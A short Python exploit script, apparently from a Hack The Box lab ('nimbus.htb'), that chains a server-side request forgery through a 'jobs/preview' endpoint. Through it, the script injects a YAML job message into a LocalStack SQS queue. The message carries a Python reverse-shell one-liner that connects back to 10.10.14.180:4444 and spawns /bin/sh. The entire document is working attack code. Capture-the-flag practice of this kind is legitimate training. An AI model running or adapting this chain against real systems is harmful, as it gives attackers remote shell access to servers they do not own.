import urllib.parse
import requests

LOCALSTACK = "172.18.0.2:4566"
ACCOUNT = "<REDACTED_ACCOUNT_ID>"
QUEUE = "nimbus-jobs"
LHOST = "10.10.14.180"
LPORT = "4444"

oneliner = (
    'import socket,subprocess,os;'
    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
    f's.connect(("{LHOST}",{LPORT}));'
    's.setblocking(1);'
    'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
    'subprocess.call(["/bin/sh","-i"])'
)

yaml_message = f"name: pwn\nscript: '{oneliner}'\n"
print("=== YAML message body ===")
print(yaml_message)

encoded_body = urllib.parse.quote(yaml_message, safe="")
sqs_url = (
    f"http://{LOCALSTACK}/{ACCOUNT}/{QUEUE}"
    f"?Action=SendMessage&Version=2012-11-05&MessageBody={encoded_body}&x=.yaml"
)
print("=== SQS SendMessage URL (truncated) ===")
print(sqs_url[:200], "...")

r = requests.post(
    "http://nimbus.htb/jobs/preview",
    data={"url": sqs_url},
    timeout=20,
)
print("=== App response (Raw response section) ===")
body = r.text
idx = body.find("Raw response")
print(body[idx: idx + 800] if idx != -1 else body[:800])
